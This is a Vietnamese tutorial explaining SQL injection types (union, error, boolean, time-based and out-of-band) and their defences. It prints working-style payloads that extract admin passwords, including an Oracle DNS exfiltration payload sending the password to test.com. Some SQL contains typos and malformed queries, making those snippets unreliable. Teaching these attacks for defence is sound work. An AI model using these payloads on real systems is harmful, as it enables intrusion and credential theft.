## MỤC LỤC

1. [Khái niệm SQL Injection](#khái-niệm-sql-injection)

2. [Nguyên nhân gây ra SQL Injection](#nguyên-nhân-gây-ra-sql-injection)

3. [Các dạng SQL Injection](#các-dạng-sql-injection)

4. [Cách phòng chống](#cách-phòng-chống)

---

## $\color{yellow}{\text{Khái niệm SQL Injection}}$

Trước hết , bạn cần phải hiểu được SQL Injection là gì ?Vì sao lại đặt đặt tên là SQLi ?

SQL là ngôn ngữ lập trình dùng để quản lý các dữ liệu trong Cơ sở dữ liệu, cũng giống như C++,PHP,...nhưng nó thực hiện lệnh với Database

Injection được dịch ra là tiêm . Nói tóm lại SQL Injection là tấn công vào trong cơ sở dữ liệu , mà cơ sở dữ liệu là nơi mà Server lưu trữ những thông tin cá nhân như password , username , ... dạng dạng thế

Ví dụ: bạn phải đăng nhập username và password ở 1 trang web , khi bạn đăng nhập đúng thì trang web sẽ trả lại bạn thông tin của account đó 

Nhập vào username bạn đã biết và password bạn đoán mò

```
username: Nguyen Kiet
password: abcxyz
```
Thì câu lệnh SQL ở phía Server sẽ chạy câu lệnh SQL như sau:

```sql
`SELECT * FORM nguoi_dung WHERE username = 'Nguyen Kiet' AND password = 'abcxyz'
```
Đây là cú pháp tiêu chuẩn của SQL lấy tất cả dữ liệu từ bảng (table) **nguoi_dung** với điều kiện là **`username = 'Nguyen  Kiet'`** và **`password = 'abcxyz'`**

Tất nhiên nó sẽ không trả về gì cả bởi vì trong bảng `nguoi_dung` không có hàng nào **`username = Nguyen Kiet`** Và **`password = abcxyz`** cả 

Vậy nếu để phải biết cả username và password thì điều đó quá khó khăn , giả sử lúc này phía Back-End nó tồn tại lỗ hổng SQLi , khi bạn nhập vào ô username ở front-end là **test** thì nó sẽ lấy chữ **test** đó ghép vào chuỗi `SELECT * FROM nguoi_dung WHERE username = 'test'` thế này 

Vậy thì sẽ thế nào nếu chúng ta nhập vào `test'-- ` . 

Lúc này câu lệnh SQL  là:
```sql
SELECT * FORM nguoi_dung WHERE username = 'test'--' AND password = 'abcxyz'
```
Ở đây dấu `--` tức là tất cả những ký tự ở phía sau nó đều là comment và Server sẽ không quan tâm đến những comment đó 
Vậy thì lúc này nó chỉ còn thực thi 
```sql
SELECT * FORM nguoi_dung WHERE username = 'test' 
```
Server lúc này nó sẽ lục trong database tìm coi dòng nào mà có `username = test` không thôi , không cần quan tâm password là gì cả 

Đó là một ví dụ điển hình về SQLi giúp bạn có thể hình dung một cách tổng quát , nói tóm lại , nó sẽ tấn công vào cơ sở dữ liệu và lấy tất cả thông tin trong cái cơ sở dữ liệu đó ra 
 



## $\color{yellow}{\text{Nguyên nhân gây ra SQL Injection}}$

- **Nguyên nhân phổ biến nhất là cộng chuỗi trực tiếp từ input của người dùng**
```sql
$query = "SELECT * FROM users WHERE id = " + $input_id;
```
ví dụ người dùng nhập: `$user_id = "1 OR 1=1";`

Thì kết quả là:
```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```
Có thể lấy dữ liệu toàn bộ bảng users chứa thông tin người dùng

- **Nguyên nhân thứ hai chính là do kiểm tra và lọc dữ liệu đầu vào không kỹ lưỡng**

Cho phép các ký tự như : `'` , `#` , `--` có thể làm thay đổi cấu trúc câu lệnh

- **Nguyên nhân thứ ba , Tấn công vào cả các HTTP Header**

Không chỉ tấn công ở các trường nhập như username hay password gì dồ , mà còn có thể SQLi thông qua các HTTP Header

ví dụ dễ hình dung như :
```sql
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$sql = "SELECT * FROM banned_ips WHERE ip = '$ip'";
```
ở burpsuite mình bắt được request và sửa :
```
X-Forwarded-For: 127.0.0.1' OR 1=1 --
```
nên câu lệnh SQL thực tế sẽ là :
```
SELECT * FROM banned_ips WHERE ip = '127.0.0.1' OR 1=1 --'
```
Nói tóm lại nguyên nhân cốt lõi vẫn là do cộng chuỗi trực tiếp và đầu vào được lọc không kĩ lưỡng .


## $\color{yellow}{\text{Các dạng SQL Injection}}$

### $\color{blue}{\text{Loại 1. In-band SQL Injection}}$

Trước tiên , In-band có nghĩa ở đây là cùng một kênh , tức là Dữ liệu đi vào (Input/payload) và dữ liệu đi ra (Output/Result) sẽ đều di chuyển trên một con đường và In-band SQLi tức là bạn tiêm lệnh vào trang web và trang web sẽ hiển thị ra kết quả ở ngay chính nó , nó không trả kết quả ra một web khác 

- $\color{red}{\text{Union-based SQLi}}$

Đúng như tên gọi của nó , kĩ thuật này sử dụng toán tử `UNION` đê gộp kết quả trả về của hai câu lệnh truy vấn khác nhau lại 

Ví dụ: Ở đây chúng ta có 1 trang web là `shoppe.com`.Trang sử dụng 2 bảng: lưu thông tin sản phảm(`table name: product`) ,lưu tài khoản người dùng(`table name: users`) 

Khi chúng ta truy cập vào đường dẫn để xem chi tiết một sản phẩm , ví dụ `shoppe.com/item?id=10` 

Lúc này hệ thống back-end sẽ chạy câu lệnh SQL để lấy thông tin sản phẩm với id=10 ấy :

```sql
SELECT ten_san_pham, gia_tien FORM product WHERE id = 10
```
Kết quả màn hình sẽ in ra là:
```
Áo thun :100.000 Đồng
```

Vấn đề xảy ra ở đây , Trang web này bị lỗi SQL Injection, Chúng ta sẽ không nhập số 10 đơn thuần mà sử dụng thêm `UNION` để lấy thêm dữ liệu từ bảng `users`

Vậy chúng ta có thể lấy bằng cách nào?-> ví dụ nếu chúng ta thực thi câu lệnh: 
```sql
SELECT ten_san_pham, gia_tien FORM product WHERE id = 10 UNION SELECT username,password FROM users
```
Thì lúc này màn hình sẽ in ra kết quả: 
```sql
Áo thun: 100.000 Đồng
admin: 123456
user1: 123456
```
Dòng 1: chính là kết quả từ câu lệnh SELECT đầu tiên 

Dòng 2: trở đi , chính là kết quả trả về từ câu lệnh SELECT thứ 2 , lấy username và password từ bảng `users` 

Và `UNION-based SQLi` chính là thế , bằng cách sử dụng `UNION` chúng ta đã lừa trang web hiển thị danh sách tài khoản và mật khẩu từ bảng `users` tại nơi mà vốn dĩ chỉ dành để hiển thị tên sản phẩm và giá . Đó là bản chất của gộp kết quả 


- $\color{red}{\text{Error-based SQLi}}$

Cố tình gây ra lỗi trong câu truy vấn ở Dataabase  và khi in ra lỗi thì trong đó sẽ bao gồm những dữ liệu hoặc cấu trúc ở trong DB 

Bạn gửi một câu lệnh SQL đúng cú pháp nhưng sai logic (chẳng hạn như ép văn bản sang Int) , Database cố gắng thực hiện lệnh đó nhưng fail và Nó báo lỗi đó ra màn hình nhưng lỗi báo ra đó lại vô tình kẹp kết quả dữ liệu từ câu truy vấn bạn truyền vào 

VD: Giả sử Database nó đang cố gắng chuyển đổi chữ `abc` thành dạng INT , nhưng chắc chắn là không thể chuyển đổi được 

Nó sẽ trả lại thông báo màn hình rằng :
```sql
**Conversion failed when converting the varchar value 'abc' to data type int.**
```
Bạn thấy đấy chữ `abc` đã được in ra màn hình cùng với cái form lỗi kia, vậy thì nếu ở đây thay `abc` bằng câu lệnh truy vấn lấy `password` từ bảng `users` 
```sql
(SELECT password FROM users)
```
thì kết quả sẽ là: 
```sql
**Conversion failed when converting the varchar value 'Mat_khau_o_day' to data type int.**
```
bởi vì Database sẽ chạy câu lệnh lấy mật khẩu kia trước rồi mới thực hiện chuyển đổi kiểu dữ liệu , nên khi xảy ra lỗi ,cái mật khẩu nó được lấy ra sẵn rồi và in toẹt ra luôn

### $\color{green}{\text{Loại 2. Blind SQL Injection}}$

Blind có nghĩa là mù thì bạn có thể hiểu Blind SQL Injection ở đây có nghĩa tấn công SQL nhưng kết quả nhận về sẽ không có rõ ràng hoặc là không có 

Giả sử In-band , nếu bạn hỏi nó "mật khẩu là gì" thì DB nó sẽ thực hiện truy vấn và sẽ trả lại bạn "123456" nhưng Blind thì khi bạn hỏi nó "mật khẩu là gì" , DB vẫn sẽ thực thi truy vấn nhưng nó sẽ không quăng kết quả "123456" ra cho bạn mà chỉ có thể trả về "success" hoặc "failed" , dạng dạng thế

- $\color{red}{\text{Boolean-based}}$

Trước tiên bạn cứ hiểu nó như là một kiểu kỹ thuật chỉ dùng truy vấn hỏi DB dạng câu hỏi đúng hoặc sai chứ không phải là dạng câu hỏi mở như In-band kia .

VD: 
Giả sử câu lệnh gốc phía Server:
```sql
SELECT * FROM products WHERE id = '$user_input'
```
Server được lập trình , nếu câu truy vấn trên có dữ liệu trả về thì in ra màn hình `success` , còn không có dữ liệu trả về từ DB thì in ra màn hình `failed` 

Chúng ta thử truyền vào:
```sql
 `1' AND (SELECT substring(password,1,1) FROM users WHERE username = 'admin') = 'a%' --`
```
Câu truy vấn lúc này:
```sql
SELECT * FORM products WHERE id = '1' AND (SELECT substring(password,1,1) FROM users WHERE username = 'admin') = 'a%' -- '
```
Tại DB sẽ kiểm tra 2 vế , Vế 1 : `id = '1'`(Giả sử ID này tồn tại) cho nên -> True 

Nhưng đến Vế 2: `(SELECT substring(password,1,1) FROM users WHERE username = 'admin') = 'a%'` , nếu ký tự đầu tiên của `password` ứng với `username` là `admin` là chữ `a` -> True 

Tổng hợp lại True AND True thì lúc này DB sẽ trả về dòng dữ liệu cho Server mà Server nhận được dữ liệu cho nên in ra màn hình là `success` -> thế là chúng ta đã biết được kí tự đầu tiên của password admin là chữ `a` , áp dụng với các ký tự ở sau -> sẽ tìm ra được password

- $\color{red}{\text{Time-based}}$

Khi mà trang web không trả về bất kì dữ liệu nào ở phía Client thì chúng ta có thể sử dụng độ trễ của thời gian phản hồi trang web làm thước đo đúng sai 

Câu lệnh truy vấn gốc phía Server:
```sql
SELECT * FROM products WHERE id = '$user_input'
```
Chúng ta sẽ truyền thử:
```sql
1' AND IF ((SELECT substring(password,1,1) FROM user WHERE username = 'admin') = '%a'),sleep(5),0) --
```
Lúc này câu truy vấn thực sẽ là:
```sql
SELECT * FROM products WHERE id = '1' AND IF ((SELECT substring(password,1,1) FROM user WHERE username = 'admin') = '%a'),sleep(5),0) --'
```
Giải thích : Database kiểm tra id = 1 -> Có -> True 

Tiếp tục check vế sau: Nếu kí tự đầu tiên của password tương ứng với username là `admin` bắt đầu bằng chữu `a` -> TH1: Load web trong 5s -> kết luận được đó là chữ `a` rồi ; TH2: nếu sai -> trả về 0 -> trang web load xong ngay lập tức


### $\color{orange}{\text{Loại 3. Out-of-band SQL Injection}}$

Cách tấn công này chỉ thực hiện được khi Server DB hỗ trợ các tính năng như DNS

Kỹ thuật này khai thác lỗ hổng bằng cách sử dụng các kênh thay thế để lấy dữ liệu từ bên ngoài 

Hình dung, bạn có trang **`test.com`** ,có khả năng ghi lại các yêu cầu mà nó nhận được (chạy dịch vụ DNS Server bên trong)

Câu lệnh truy vấn gốc phía Server nạn nhân: 
```sql
SELECT * FROM users WHERE id ='$user_input'
```
Thử truyền vào:
```sql
' || (SELECT UTL_INADDR.GET_HOST_ADDRESS(password ||'.test.com') FROM users WHERE username = 'admin') || '
```
Lệnh truy vấn sẽ thực thi:
```sql
SELECT * FROM users WHERE id ='' || (SELECT UTL_INADDR.GET_HOST_ADDRESS(SELECT password FROM users WHERE username = 'admin'||'.test.com')) || ''
```
Giải thích: đây là cú pháp áp dụng với hệ quản trị CSDL Oracle

- `UTL_INADDR`: một gói có sẵn trong Oracle cung cấp các hàm để truy cập thông tin mạng

- `GET_HOST_ADDRESS`: hàm này có chức năng lấy địa chỉ IP của tên miền 

- Dấu `||` là dấu nối chuối trong Database Oracle 

Để câu truy vấn trên thực thi , đầu tiên DB sẽ phải xác định được `id` , vế đầu tiên `id` = rỗng

Vế tiếp theo sau dấu `||` , `SELECT password FROM users WHERE username = 'admin'` sẽ chạy và lấy ra được mật khẩu ví dụ là `123456` 

Rồi nối chuỗi với `.test.com` kết quả sẽ là: `123456.test.com` 

Tiếp tục Database cần tìn địa chỉ IP của `123456.test.com` cho nên sẽ gửi một truy vấn DNS đến DNS Server của `test.com` 

Lúc này tại file log Server `test.com` (tức Server bạn) sẽ bắt được hành động từ Database , khi mở file log lên thì nó có dạng:

```log
Dec 20 10:00:02 ns1 named[1234]: client @0x7f.. 113.161.99.99#41233: query: 123456.test.com IN A + (100.200.1.1)
```
Và bạn nhìn thấy được dòng `123456.test.com` và `123456` đó chính là password của `admin` 



## $\color{yellow}{\text{Cách phòng chống}}$

### $\color{red}{\text{Đối với UNION-based SQLi}}$

- Sử dụng **Prepared Statements:**

Thay vì dùng nối chuỗi, thì sử dụng các placeholder như `?` . Khi đó DB sẽ hiểu dữ liệu đầu vào là một văn bản đơn thuần. 

VD: Hacker nhập vào `' OR 1=1 --` thì lúc này DB sẽ tìm kiếm có cái nào trong DB là `' OR 1=1 --` hay không .

- **Ép kiểu dữ liệu:** 

Nếu tham số dùng để tìm kiếm thông tin là `id` , `page` , ... bắt buộc phải dạng số 

Trong Code Back-end, hãy luôn đưa input về **INT** trước khi cho vào câu truy vấn 

VD: Hacker nhập: `10' UNION SELECT ...` , biến `$id` sẽ chỉ nhận `10` hoặc báo lỗi

- **Sử dụng Whitelist:**

Nếu đầu vào là chuỗi , thì sử dụng danh sách cho phép (ví dụ `sort=name`, `sort=price` ,..)

Chỉ cho phép người dùng nhập các giá trị được định sẵn

- **Sử dụng WAF(Web Application Firewall):**

Chặn các từ khóa đặc trưng :`UNION`, `SELECT`, `ORDER BY`,...

### $\color{red}{\text{Đối với Error-based SQLi}}$

- **Tắt hiển thị lỗi chi tiết**

Cần cấu hình sao cho khi hệ thống lỗi thì sẽ in ra một thông báo chung như là **`Đã xảy ra lỗi hệ thống (HTTP 500)`**

- **Kiểm tra dữ liệu đầu vào**

**Error based** thường bị khai thác bởi lỗi ép kiểu dữ liệu .

Nên nếu đầu vào là số thì dùng hàm `is_numberic()` hoặc ép kiểu `int()` trước khi đưa vào câu truy vấn

### $\color{red}{\text{Đối với Boolean-based}}$

- Sử dụng **Prepared Statement**

Cách này vẫn luôn là số 1 , chấp mọi kiểu khai thác 

Giả sử câu truy vấn gốc `SELECT * FROM products WHERE id = ?

Hacker nhập: `1' AND SLEEP(5)` 

Lúc này DB nó sẽ tìm kiếm coi có `id` nào là `1' AND SLEEP(5)` hay không -> **Mission Failed**

- **Sử dụng WAF**

Chặn các từ khóa đặc trưng của `Boolean-based`: `SELECT` , `substring`, `mid` , `AND` , `OR` , `LOCATE` ,...

Giới hạn tốc độ: Chặn địa chỉ IP đó nếu phát hiện quá nhiều `Request/s` 

- **Kiểm tra dữ liệu đầu vào:**

Boolean-Based thường phải dùng các toán tử so sánh và logic thì để chặn lại , chúng ta sẽ sử dụng WhiteList và BlackList 

Nếu đầu vào cần số: Chỉ cho phép số `0-9`

Nếu đầu vào cần chuỗi: Chỉ cho phép chữ cái và số , cấm các ký tự đặc biệt như `OR` , `AND`, `#` , `-`, `>`, `<`, `=`.

### $\color{red}{\text{Đối với Time-based}}$

- Sử dụng **Prepared Statement** 

- **Thiết lập Time Out cho câu truy vấn**

Vì hacker thường dùng `Sleep(5)` hoặc `Sleep(10)` để Server tải trang trong 5s hoặc 10s để phân biệt dấu hiệu

Vậy nên thiết lập Time Out để giới hạn thời gian thực thi câu truy vấn 

Giả sử mình thiết lập mọi truy vấn chỉ được chạy tối đa 1s thì mọi truy vấn mà có sleep(5) của hacker sẽ bị ngắt giữa chừng và cũng trở nên vô nghĩa

- **Giới hạn tốc độ Request** (như mình đã nói ở Boolean-Based)

- **Kiểm soát đầu vào** (cũng tương tự như cái mình nói ở Boolean-Based)

### $\color{red}{\text{Đối với Out-of-band}}$

- Sử dụng **Prepared Statement** vẫn là gốc

- **Vô hiệu hóa hàm truy cập mạng:**

Như ví dụ ở trên thì chặn các gói `UTL_INADDR` , không allow người dùng sử dụng các gói này , chỉ admin mới được dùng nó

- **Lọc dữ liệu chiều đi:**

Cấu hình tường lửa cho máy chủ Database

Chỉ cho phép DB trả lời yêu cầu từ chính Server nội bộ của nó

Vì vậy khi DB bị cô lập hoàn toàn trong mạng nội bộ thì Out-band cũng trở nên vô nghĩa 
